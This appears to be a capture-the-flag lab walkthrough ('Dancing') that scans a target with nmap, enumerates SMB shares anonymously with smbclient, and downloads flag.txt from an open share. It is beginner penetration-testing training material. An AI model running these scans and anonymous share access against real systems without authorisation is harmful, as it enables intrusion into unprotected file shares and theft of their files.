# Dancing

## Verify connectivity to the target

Send an ICMP echo request to confirm that the target is reachable.

Command:

```bash
ping <target_ip>
```

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -Pn -sV <target_ip>
```

Expected result:

* Port 445: SMB (Server Message Block)

## Enumerate available SMB shares

List all accessible SMB shares on the target.

Command:

```bash
smbclient -L //<target_ip> -N
```

The `-N` flag attempts authentication without a password.

## Connect to an SMB share

Connect to the identified share.

Command:

```bash
smbclient //<target_ip>/<share_name> -N
```

## List files and directories

Once connected, enumerate the contents of the share.

Command:

```bash
ls
```

## Navigate through directories

Move into a directory of interest.

Command:

```bash
cd <directory_name>
```

List its contents:

```bash
ls
```

## Download files from the SMB share

Retrieve files from the share to the local machine.

Command:

```bash
get <file_name>
```

## Retrieve the flag

Locate the flag file within the accessible share and download it.

Command:

```bash
get flag.txt
```

Display the contents of the downloaded file:

```bash
cat flag.txt
```

The flag is successfully obtained.
